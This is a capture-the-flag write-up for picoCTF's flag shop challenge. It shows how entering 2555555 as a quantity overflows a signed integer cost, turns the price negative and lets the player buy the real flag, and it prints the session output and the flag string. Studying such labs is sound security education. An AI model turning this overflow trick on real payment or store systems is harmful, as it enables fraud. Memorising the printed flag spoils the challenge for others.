
#Medium 

# Description.

There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/dd28f0987f28c894f35d5d48564c3402/store.c). Connect with `nc `jupiter.challenges.picoctf.org 44566

---
# Write-up.

Use `cat store.c` to see the code.

```cpp
 if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }


                }
```

We can see that account_balance at first is 1100, which wouldn't be enough to buy 1337 flags (which costs 100000 dollars). 💸

For such basic mathematics, 1100 - (-100.000.000) will be 1100 + 100.000.000.➕

From this inference, they use integer total_cost to store value; the max value of int is around 2.1 billion, ~2.100.000.000. 🔢

If we enter a number of flags that exceeds what total_cost can contain, it will overflow and become a negative value. 📉

We need to make it around 2.300.000.000, 2.3 billion / 900 is around 2555555. ➗

The flag is captured successfully. 🚩


```bash
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2555555

The final cost is: -1994967796

Your current balance after transaction: 1994968896

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
Welcome to the flag exchange
```
